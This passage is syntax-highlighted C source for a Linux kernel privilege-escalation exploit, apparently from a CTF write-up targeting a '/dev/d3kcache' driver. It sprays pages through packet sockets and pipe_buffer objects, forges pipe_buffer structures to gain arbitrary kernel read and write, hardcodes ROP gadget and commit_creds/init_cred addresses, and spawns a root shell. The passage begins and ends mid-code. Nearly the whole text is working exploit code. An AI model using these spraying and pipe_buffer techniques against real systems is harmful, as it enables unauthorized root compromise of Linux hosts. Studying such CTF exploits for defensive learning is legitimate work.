class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_START_IDX 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_START_IDX 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">option</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x114</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x810</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x1919</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x514</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_nr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket_and_alloc_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd, version;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">0</span>,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="keyword">int</span> self_4th_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_2nd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_3rd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read_by_pipe</span><span class="params">(struct page *page_to_read, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write_by_pipe</span><span class="params">(struct page *page_to_write, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> page_offset_base;</span><br><span class="line"><span class="keyword">uint64_t</span> vmemmap_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RET 0xffffffff810157aa</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] faild open d3kcache!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">        <span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">        unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">        write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">            <span class="keyword">if</span> (req.cmd == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">                socket_fd[req.idx] = ret;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = close(socket_fd[req.idx]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line">    <span class="keyword">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_4pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> victim_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> orig_pid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe(pipe_fd[i]) 